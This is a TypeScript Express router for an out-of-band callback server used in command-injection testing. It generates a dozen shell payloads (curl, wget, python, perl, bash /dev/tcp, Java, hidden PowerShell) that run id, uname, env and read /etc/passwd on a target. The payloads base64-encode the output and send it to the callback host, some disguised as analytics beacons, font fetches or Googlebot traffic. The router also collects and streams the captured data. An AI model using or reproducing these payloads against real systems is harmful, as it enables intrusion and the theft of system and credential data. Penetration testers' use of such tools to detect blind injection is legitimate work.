import { Router, type IRouter, type Request, type Response } from "express";
import { randomBytes } from "crypto";
import { addHit, getHits, clearHits, oobEvents, isRateLimited, generateToken, type OobHit } from "../oob/oobStore.js";

const router: IRouter = Router();

function cbBase(req: Request): string {
  const host  = (req.headers["x-forwarded-host"] as string) || req.headers["host"] || "localhost";
  const proto = ((req.headers["x-forwarded-proto"] as string) || req.protocol || "http").split(",")[0]!.trim();
  return `${proto}://${host}/api/oob/cb`;
}

function buildPolymorphicPayloads(base: string, token: string): Record<string, string> {
  const cb = `${base}/${token}`;

  let cbHost = "localhost";
  let cbPort = "80";
  try {
    const u = new URL(base);
    cbHost  = u.hostname;
    cbPort  = u.port || (u.protocol === "https:" ? "443" : "80");
  } catch { /* keep defaults */ }

  return {
    wget_pixel:
      `wget -qO/dev/null --user-agent="Mozilla/5.0 AppleWebKit/537.36" "${cb}/pixel.gif?id=$(hostname|base64 -w0 2>/dev/null||hostname|base64)&d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,

    analytics_beacon:
      `_d=$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64); curl -sk -H "Referer: https://www.google-analytics.com/collect" -H "Content-Type: text/plain" "${cb}?v=1&tid=UA-000000&cid=\${_d:0:8}&t=pageview&dp=%2F&d=\${_d}" 2>/dev/null &`,

    python3_urllib:
      `python3 -c "import urllib.request as u,base64,os;d=base64.b64encode(os.popen('id && uname -a && env').read(2048).encode()).decode();req=u.Request('${cb}?d='+d,headers={'User-Agent':'Mozilla/5.0','Accept':'image/webp,*/*'});u.urlopen(req)" 2>/dev/null &`,

    curl_font_fetch:
      `curl -sk -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" -H "Sec-Fetch-Dest: font" -H "Sec-Fetch-Mode: cors" "${cb}?d=$(id|base64 -w0 2>/dev/null||id|base64)" 2>/dev/null &`,

    curl_post_xhr:
      `_o=$(id && uname -a && cat /etc/passwd 2>/dev/null|head -5); curl -sk --data-binary "id=$(hostname)&data=$(echo "\${_o}"|base64 -w0 2>/dev/null||echo "\${_o}"|base64)" "${cb}" -H "Content-Type: application/x-www-form-urlencoded" -H "X-Requested-With: XMLHttpRequest" 2>/dev/null &`,

    bash_pipe_raw:
      `(id;uname -a;env;cat /etc/passwd 2>/dev/null|head -5)|curl -sk --data-binary @- '${cb}' 2>/dev/null &`,

    curl_exfil:
      `_o=$(id && uname -a && hostname && cat /etc/passwd 2>/dev/null|head -5);curl -sk "${cb}?d=$(printf '%s' "$_o"|base64 -w0 2>/dev/null||printf '%s' "$_o"|base64)" 2>/dev/null`,

    perl_http:
      `perl -MLWP::UserAgent -e "use MIME::Base64;my \$ua=LWP::UserAgent->new;my \$d=encode_base64(\`id && uname -a\`);chomp(\$d);\$ua->get('${cb}?d='.\$d)" 2>/dev/null &`,

    python3_socket:
      `python3 -c "import socket,os,base64;d=base64.b64encode(os.popen('id && uname -a && hostname').read().encode()).decode();s=socket.create_connection(('${cbHost}',${cbPort}));s.send(b'GET /api/oob/cb/${token}?d='+d.encode()+b' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n');s.close()" 2>/dev/null &`,

    bash_devtcp:
      `exec 3>/dev/tcp/${cbHost}/${cbPort} 2>/dev/null && printf 'GET /api/oob/cb/${token}?d='$(id && uname -a 2>&1|base64 -w0 2>/dev/null||id|base64)' HTTP/1.0\\r\\nHost: ${cbHost}\\r\\n\\r\\n'>&3 && exec 3>&- 2>/dev/null &`,

    java_url:
      `java -cp . -e "new java.net.URL(\\"${cb}?d=\\"+java.util.Base64.getEncoder().encodeToString(Runtime.getRuntime().exec(new String[]{\\"sh\\",\\"-c\\","id && uname -a\\"}).getInputStream().readAllBytes())).openStream().close();" 2>/dev/null & python3 -c "import urllib.request,base64,subprocess;urllib.request.urlopen('${cb}?d='+base64.b64encode(subprocess.check_output(['sh','-c','id && uname -a'],stderr=-1)).decode())" 2>/dev/null &`,

    powershell_iwr:
      `powershell -NoP -NonI -W Hidden -c "iwr -Uri '${cb}?d='+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((iex 'id 2>&1')))+'' -UseBasicParsing" 2>/dev/null & cmd /c "powershell -c \"$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c id 2^>^&1)));iwr -Uri '${cb}?d='+$d -UseBasicParsing\" 2>nul"`,
  };
}

router.get("/oob/token", (req: Request, res: Response) => {
  const token = generateToken();
  const base  = cbBase(req);
  res.json({
    token,
    cbUrl: `${base}/${token}`,
    payloads: buildPolymorphicPayloads(base, token),
  });
});

function receiveCallback(req: Request, res: Response): void {
  const sourceIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "?";
  if (isRateLimited(sourceIp)) { res.status(429).send("rate limited"); return; }

  const token   = (req.params as Record<string, string>)["token"] ?? "default";
  const query   = Object.fromEntries(Object.entries(req.query as Record<string, unknown>).map(([k, v]) => [k, String(v)]));
  const bodyStr = typeof req.body === "string" ? req.body
    : (req.body && typeof req.body === "object" && Object.keys(req.body as object).length) ? JSON.stringify(req.body) : "";

  const rawData = query["d"] ?? query["data"] ?? query["cmd"] ?? query["q"] ?? bodyStr ?? "";
  let data = rawData;
  if (rawData) {
    try {
      const dec = Buffer.from(rawData.replace(/[ ]/g, "+"), "base64").toString("utf8");
      if (dec && /[\x20-\x7e]/.test(dec) && dec.length > 2) data = dec;
    } catch { /**/ }
  }

  const safeHdrs: Record<string, string> = {};
  for (const [k, v] of Object.entries(req.headers)) {
    if (typeof v === "string") safeHdrs[k] = v; else if (Array.isArray(v)) safeHdrs[k] = v.join(", ");
  }
  const hit: OobHit = {
    id: randomBytes(6).toString("hex"), ts: Date.now(), type: "http",
    method: req.method, path: req.path, sourceIp,
    userAgent: (req.headers["user-agent"] as string) ?? "",
    headers: safeHdrs, body: bodyStr.slice(0, 8192), query,
    data: data.slice(0, 8192), token,
    size: Number(req.headers["content-length"] ?? 0) || bodyStr.length,
  };
  addHit(hit);

  const accept = (req.headers["accept"] as string) ?? "";
  if (accept.includes("image/")) {
    res.setHeader("Content-Type", "image/gif");
    res.end(Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"));
  } else { res.json({ ok: true, id: hit.id, ts: hit.ts }); }
}

router.all("/oob/cb",        receiveCallback);
router.all("/oob/cb/:token", receiveCallback);

router.get("/oob/hits",    (_req: Request, res: Response) => { const h = getHits(); res.json({ hits: h, total: h.length }); });
router.delete("/oob/hits", (_req: Request, res: Response) => { clearHits(); res.json({ ok: true }); });
router.get("/oob/status",  (req: Request, res: Response) => {
  const h = getHits(); res.json({ total: h.length, cbBase: cbBase(req), latest: h[0] ?? null });
});

router.get("/oob/stream", (req: Request, res: Response) => {
  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.flushHeaders();

  for (const hit of getHits(50)) {
    try { res.write(`event: hit\ndata: ${JSON.stringify(hit)}\n\n`); } catch { /**/ }
  }
  const onHit   = (h: OobHit) => { try { res.write(`event: hit\ndata: ${JSON.stringify(h)}\n\n`); } catch { /**/ } };
  const onClear = ()           => { try { res.write("event: cleared\ndata: {}\n\n"); } catch { /**/ } };
  oobEvents.on("hit", onHit); oobEvents.on("cleared", onClear);
  const ping = setInterval(() => { try { res.write(": ping\n\n"); } catch { /**/ } }, 25_000);
  req.on("close", () => { oobEvents.off("hit", onHit); oobEvents.off("cleared", onClear); clearInterval(ping); try { res.end(); } catch { /**/ } });
});

export default router;
